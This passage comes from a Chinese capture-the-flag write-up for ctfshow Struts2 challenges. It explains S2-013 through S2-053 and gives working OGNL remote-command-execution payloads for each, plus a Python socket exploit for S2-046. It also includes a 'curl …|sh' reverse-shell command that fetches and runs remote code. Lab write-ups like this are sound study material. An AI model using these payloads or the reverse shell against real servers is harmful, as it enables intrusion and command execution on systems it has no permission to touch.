class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;id&#x27;</span>).getInputStream(),#b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#a),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#b),#d=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#c.read(#d),#out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 ${ognl_exp} OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强</p><p>这里的话还是env   但是得把poc进行url全编码</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4e4c3c86-4fbd-4809-8809-8fffe7c3461d.challenge.ctf.show/S2-013/link.action?aspan><br></pre></td></tr></table></figure><h2 id="web286-S2-015"><a href="#web286-S2-015" class="headerlink" title="web286-S2-015"></a>web286-S2-015</h2><p>题目</p><p><strong>漏洞原理</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-015&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">    &lt;action name=<span class="string">&quot;*&quot;</span> class=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span><br><span class="line">        &lt;result&gt;/&#123;<span class="number">1</span>&#125;.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功</p><p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[‘allowStaticMethodAccess’]=true 来修改其值达到重获静态方法调用的能力</p><p>影响版本: 2.0.0 - 2.3.14.2</p><p><strong>测试漏洞</strong></p><p><img src="../images/image-20230222210606236.png" alt="image-20230222210606236"></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>,#m=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>),#m.setAccessible(<span class="literal">true</span>),#m.set(#_memberAccess,<span class="literal">true</span>),#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>,#q&#125;.action</span><br></pre></td></tr></table></figure><p>得要url全编码并且将id改为env</p><h2 id="web287-S2-016"><a href="#web287-S2-016" class="headerlink" title="web287-S2-016"></a>web287-S2-016</h2><p>题目</p><p><img src="../images/image-20230223200203561.png" alt="image-20230223200203561"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</span><br><span class="line"></span><br><span class="line">所以，访问http://your-ip:8080/default.action?redirect:OGNL表达式即可执行OGNL表达式</span><br><span class="line"></span><br><span class="line">影响版本: 2.0.0 - 2.3.15</span><br></pre></td></tr></table></figure><p>poc</p><p><strong>执行命令</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%<span class="number">24</span>%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%3Dfalse%2C%<span class="number">23f</span>%<span class="number">3D</span>%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%<span class="number">22</span>)%2C%<span class="number">23f</span>.setAccessible(<span class="literal">true</span>)%2C%<span class="number">23f</span>.set(%23_memberAccess%2Ctrue)%2C%23a%<span class="number">3D</span>%40java.lang.Runtime%40getRuntime().exec(%22env%<span class="number">22</span>).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%<span class="number">23d</span>%3Dnew%20char%5B5000%<span class="number">5D</span>%2C%23c.read(%<span class="number">23d</span>)%2C%23genxor%<span class="number">3D</span>%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>).getWriter()%2C%23genxor.println(%<span class="number">23d</span>)%2C%23genxor.flush()%2C%23genxor.close()%<span class="number">7D</span></span><br></pre></td></tr></table></figure><h2 id="web288-S2-019"><a href="#web288-S2-019" class="headerlink" title="web288-S2-019"></a>web288-S2-019</h2><p>题目</p><p><img src="../images/image-20230223201046125.png" alt="image-20230223201046125"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">动态方法调用的默认启用，原理类似于s2-008</span><br><span class="line"></span><br><span class="line">Apache Struts 2的“Dynamic Method Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&#x27;id&#x27;</span>)).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#out=#context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>),#out.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</span><br><span class="line"><span class="comment">// 利用是先进行url编码    </span></span><br></pre></td></tr></table></figure><p>与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder</p><p>影响版本：Struts 2.0.0 - Struts 2.3.15.1</p><p>这里的话和<strong>web286</strong>一样，得进行shell反弹，现在还不会，先留着。</p><h2 id="web289-S2-029"><a href="#web289-S2-029" class="headerlink" title="web289-S2-029"></a>web289-S2-029</h2><p>题目</p><p><img src="../images/image-20230223213512376.png" alt="image-20230223213512376"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估</span><br><span class="line"></span><br><span class="line">例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%&#123;&#125;”。最终造成二次执行</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span>.action?message=(%23_memberAccess[<span class="string">&#x27;allowPrivateAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;allowProtectedAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;excludedPackageNamePatterns&#x27;</span>]=%23_memberAccess[<span class="string">&#x27;acceptProperties&#x27;</span>],%23_memberAccess[<span class="string">&#x27;excludedClasses&#x27;</span>]=%23_memberAccess[<span class="string">&#x27;acceptProperties&#x27;</span>],%23_memberAccess[<span class="string">&#x27;allowPackageProtectedAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>)</span><br></pre></td></tr></table></figure><p>这题也要弹shell</p><h2 id="web290-S2-032"><a href="#web290-S2-032" class="headerlink" title="web290-S2-032"></a>web290-S2-032</h2><p>题目</p><p><img src="../images/image-20230223214103082.png" alt="image-20230223214103082"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞</span><br><span class="line"></span><br><span class="line">影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23res%<span class="number">3d</span>%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%<span class="number">5D</span>),%23w%<span class="number">3d</span>%23res.getWriter(),%23s%3dnew+java.util.Scanner(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%23parameters.cmd%5B0%<span class="number">5D</span>).getInputStream()).useDelimiter(%23parameters.pp%5B0%<span class="number">5D</span>),%23str%<span class="number">3d</span>%23s.hasNext()%<span class="number">3f</span>%23s.next()%3a%23parameters.ppp%5B0%<span class="number">5D</span>,%23w.print(%23str),%23w.close(),<span class="number">1</span>?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%<span class="number">20</span>&amp;encoding=UTF-<span class="number">8</span>&amp;cmd=id</span><br></pre></td></tr></table></figure><h2 id="web291-S2-033"><a href="#web291-S2-033" class="headerlink" title="web291-S2-033"></a>web291-S2-033</h2><p>题目</p><p><img src="../images/image-20230223214556408.png" alt="image-20230223214556408"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/<span class="number">4</span>/%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23xx%3d123,%23rs%<span class="number">3d</span><span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream())</span>,%23wr%<span class="number">3d</span>%23context[%23parameters.obj[<span class="number">0</span>]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">2908</span>&amp;command=id</span><br></pre></td></tr></table></figure><h2 id="web292-S2-037"><a href="#web292-S2-037" class="headerlink" title="web292-S2-037"></a>web292-S2-037</h2><p>题目</p><p><img src="../images/image-20230223214824621.png" alt="image-20230223214824621"></p><p>漏洞原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/orders/<span class="number">3</span>/%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23xx%3d123,%23rs%<span class="number">3d</span><span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream())</span>,%23wr%<span class="number">3d</span>%23context[%23parameters.obj[<span class="number">0</span>]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">2908</span>&amp;command=whoami</span><br></pre></td></tr></table></figure><h2 id="web293-S2-045"><a href="#web293-S2-045" class="headerlink" title="web293-S2-045"></a>web293-S2-045</h2><p>题目</p><p><img src="../images/image-20230223220621960.png" alt="image-20230223220621960"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵</span><br><span class="line">恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: <span class="string">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;whoami&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span> boundary=----WebKitFormBoundaryXx80aU0pu6vrsV3z</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是得需要反弹shell</p><h2 id="web294-S2-046"><a href="#web294-S2-046" class="headerlink" title="web294-S2-046"></a>web294-S2-046</h2><p>题目</p><p><img src="../images/image-20230223221152582.png" alt="image-20230223221152582"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用\x00截断</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</span><br></pre></td></tr></table></figure><p>由于需要发送畸形数据包，简单使用原生socket编写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br></pre></td></tr></table></figure><h2 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295-S2-048"></a>web295-S2-048</h2><p>题目</p><p><img src="../images/image-20230223224111641.png" alt="image-20230223224111641"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用</span><br><span class="line">而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击</span><br><span class="line"></span><br><span class="line">影响版本: 2.0.0 - 2.3.32</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230223224214133.png" alt="image-20230223224214133"></p><p>以第一个参数为攻击点，在其执行OGNL语法，${10-7}，点击submit</p><p><img src="../images/image-20230223224230773.png" alt="image-20230223224230773"></p><p><img src="../images/image-20230223224302364.png" alt="image-20230223224302364"></p><p>成功执行了</p><p>借用S2-045的沙盒绕过方法，改了一个POC。将如下POC填入表单<code>Gengster Name</code>中，提交即可直接回显命令执行的结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>).(#q)&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230223225251474.png" alt="image-20230223225251474"></p><p>也可以使用s2-045poc，抓包修改content-type</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web296-S2-052"><a href="#web296-S2-052" class="headerlink" title="web296-S2-052"></a>web296-S2-052</h2><p>题目</p><p><img src="../images/image-20230223225504667.png" alt="image-20230223225504667"></p><p><strong>漏洞原理</strong></p><p><img src="../images/image-20230223225531458.png" alt="image-20230223225531458"></p><p>还是得用工具，但是得反弹shell，因为env太长了，有长度限制，只输出半截</p><p><img src="../images/image-20230223225835015.png" alt="image-20230223225835015"></p><p>这里的话得需要s2-045漏洞</p><h2 id="web297-S2-053"><a href="#web297-S2-053" class="headerlink" title="web297-S2-053"></a>web297-S2-053</h2><p>题目</p><p><img src="../images/image-20230223230033073.png" alt="image-20230223230033073"></p><p><strong>漏洞原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#process.getInputStream())</span>)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还是得反弹shell.</p><p>就是先利用工具，查找存在哪些漏洞，然后就去利用执行这个漏洞，然后就输入下面的curl命令就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span><br></pre></td></tr></table></figure><p>这就是反弹shell的方法，其实还有很多种语言的反弹shell的方法</p><p>your-shell ——&gt;这个是反弹工具网址</p><p>在b站的  <a href="https://www.bilibili.com/video/BV13P4y1M7EF/?spm_id_from=333.337.search-card.all.click&amp;vd_source=bacfffe46b930fda5761b63367eb298c">反弹shell讲解</a> </p><h2 id="web298-反编译"><a href="#web298-反编译" class="headerlink" title="web298-反编译"></a>web298-反编译</h2><p>题目</p><p><img src="../images/image-20230223231242469.png" alt="image-20230223231242469"></p><p><strong>题目附件一个war包</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar包和war包都可以看成压缩文件，都可以用解压软件打开，jar包和war包都是为了项目的部署和发布，通常在打包部署的时候，会在里面加上部署的相关信息。这个打包实际上就是把代码和依赖的东西压缩在一起，变成后缀名为.jar和.war的文件，就是我们说的jar包和war包。但是这个“压缩包”可以被编译器直接使用，把war包放在tomcat目录的webapp下，tomcat服务器在启动的时候可以直接使用这个war包。通常tomcat的做法是解压，编译里面的代码，所以当文件很多的时候，tomcat的启动会很慢。</span><br><span class="line"></span><br><span class="line">jar包和war包的区别：jar包是java打的包，war包可以理解为javaweb打的包，这样会比较好记。jar包中只是用java来写的项目打包来的，里面只有编译后的class和一些部署文件。而war包里面的东西就全了，包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。</span><br></pre></td></tr></table></figure><p>使用工具<a href="https://github.com/java-decompiler/jd-gui/releases">Java decompiler</a>反编译class文件</p><p><img src="../images/image-20230224191707065.png" alt="image-20230224191707065"></p><p><img src="../images/image-20230224191718054.png" alt="image-20230224191718054"></p><p>查看源码发现两个函数，只要username=admin&amp;password=ctfshow的话，这个函数就会返回true,然后就会打印flag.</p><h2 id="web299-文件读取"><a href="#web299-文件读取" class="headerlink" title="web299-文件读取"></a>web299-文件读取</h2><p>题目</p><p><img 